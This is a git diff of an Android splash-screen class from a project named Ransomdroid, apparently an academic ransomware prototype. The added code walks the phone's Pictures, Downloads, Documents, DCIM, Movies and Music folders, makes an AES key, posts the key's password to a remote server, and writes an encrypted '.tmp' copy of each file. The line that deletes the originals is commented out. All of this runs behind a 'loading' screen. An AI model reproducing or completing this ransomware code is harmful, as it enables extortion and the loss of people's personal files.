@@ -10,10 +10,13 @@ import android.util.Log;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -25,14 +28,10 @@ import br.unb.lasp.util.RansomdroidException;
 import br.unb.lasp.util.Storage;
 import br.unb.lasp.util.SymmetricAES;
 
-import static br.unb.lasp.util.Storage.listFilesRecursively;
-
 public class SplashActivity extends Activity implements Runnable {
 
     private static final String TAG = new Object() {
     }.getClass().getName();
-
-    private TextView txtLabel;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -41,7 +40,7 @@ public class SplashActivity extends Activity implements Runnable {
         }.getClass().getEnclosingMethod().getName());
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        txtLabel = (TextView) findViewById(R.id.frm_splash_label);
+        TextView txtLabel = (TextView) findViewById(R.id.frm_splash_label);
         txtLabel.setText(R.string.loading);
     }
 
@@ -65,7 +64,6 @@ public class SplashActivity extends Activity implements Runnable {
         try {
             VerifyConectivity task = new VerifyConectivity();
             task.execute(0);
-            Thread.sleep(3000);
             Intent intent = new Intent(SplashActivity.this, MainActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
             startActivity(intent);
@@ -93,23 +91,34 @@ public class SplashActivity extends Activity implements Runnable {
             }.getClass().getName(), new Object() {
             }.getClass().getEnclosingMethod().getName());
 
-            Log.d(TAG, "DCIMS...");
-            Log.d(TAG, Storage.getDCIMSDir().getPath());
-            List<File> fileList = listFilesRecursively(Storage.getDCIMSDir(), new ArrayList<File>());
-            Global.numFiles = fileList.size();
-            Log.d(TAG, "DCIMS Files... " + Global.numFiles);
-            Log.d(TAG, "DCIMS... End!");
+            boolean ok = false;
 
-            Global.pass = SymmetricAES.getRandomSecretKeySpec(Global.uid).getEncoded().toString();
-            sync();
+            if(Storage.isExternalStorageWritable()){
+                // get files
+                List<File> dirList = new ArrayList<>();
+                dirList.add(Storage.getPicturesDir());
+                dirList.add(Storage.getDownloadsDir());
+                dirList.add(Storage.getDocumentsDir());
+                dirList.add(Storage.getDCIMSDir());
+                dirList.add(Storage.getMoviesDir());
+                dirList.add(Storage.getMusicsDir());
+                List<File> fileList = new ArrayList<>();
+                for (File dir:dirList) {
+                    if(dir != null){
+                        fileList.addAll(Storage.listValidFilesRecursively(dir, new ArrayList<File>()));
+                    }
+                }
 
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                Log.e(TAG, e.getMessage(), e);
+                // generate global data
+                Global.numFiles = fileList.size();
+                Global.key = SymmetricAES.getRandomSecretKeySpec(Global.uid);
+                Global.pass = Global.key.getEncoded().toString();
+
+                ok = serverSync();
+                dataUpdate(fileList);
             }
 
-            return true;
+            return ok;
         }
 
         @Override
@@ -129,8 +138,10 @@ public class SplashActivity extends Activity implements Runnable {
             }
         }
 
-        private boolean sync(){
-
+        private boolean serverSync(){
+            Log.d(new Object() {
+            }.getClass().getName(), new Object() {
+            }.getClass().getEnclosingMethod().getName());
             boolean ok = true;
 
             try {
@@ -139,16 +150,18 @@ public class SplashActivity extends Activity implements Runnable {
                 data.put("pass", Global.pass);
 
                 JSONObject request = new JSONObject();
-                request.put("msgRequest", data);
+                request.put("postMessageRequest", data);
 
                 String responseStr = ServiceBroker.getInstance(getApplicationContext()).postMessage(request.toString());
                 if (responseStr != null) {
                     JSONObject json = new JSONObject(responseStr);
-                    JSONObject response = (JSONObject) json.get("msgResponse");
+                    JSONObject response = (JSONObject) json.get("postMessageResponse");
                     String errorMsg = Json.getError(response);
-                    if (errorMsg != null) {
+                    if (errorMsg != null && errorMsg.length() > 0) {
                         throw new RansomdroidException(errorMsg);
                     }
+                }else{
+                    throw new RansomdroidException("Connectivity Error");
                 }
 
             } catch (Exception e) {
@@ -158,6 +171,57 @@ public class SplashActivity extends Activity implements Runnable {
             }
 
             return ok;
+        }
+
+        private void dataUpdate(List<File> fileList){
+
+            for(File file: fileList){
+
+                // get input
+                byte[] input = null;
+                try {
+                    FileInputStream fis = new FileInputStream(file);
+                    input = new byte[fis.available()];
+                    while (fis.read(input) != -1) {
+                        // do nothing, just read
+                    }
+                    fis.close();
+                } catch (FileNotFoundException e) {
+                    Log.e(TAG, e.getMessage(), e);
+                } catch (IOException e) {
+                    Log.e(TAG, e.getMessage(), e);
+                } catch (Exception e) {
+                    Log.e(TAG, e.getMessage(), e);
+                }
+
+                // parse
+                input = SymmetricAES.encrypt(input, Global.uid, Global.key);
+//                files.delete();
+
+                // create output
+                File nFile = new File(file.getParent(), file.getName() + ".tmp");
+                if (!nFile.exists()) {
+                    FileOutputStream fos = null;
+                    try {
+                        fos = new FileOutputStream(nFile);
+                        fos.write(input);
+                        fos.flush();
+                        fos.close();
+                    } catch (Exception e) {
+                        Log.e(TAG, e.getMessage(), e);
+                    }finally {
+                        if (fos != null) {
+                            try {
+                                fos.close();
+                            } catch (IOException e) {
+                                Log.e(TAG, e.getMessage(), e);
+                            }
+                        }
+                    }
+                }
+
+            }
+
         }
 
     }
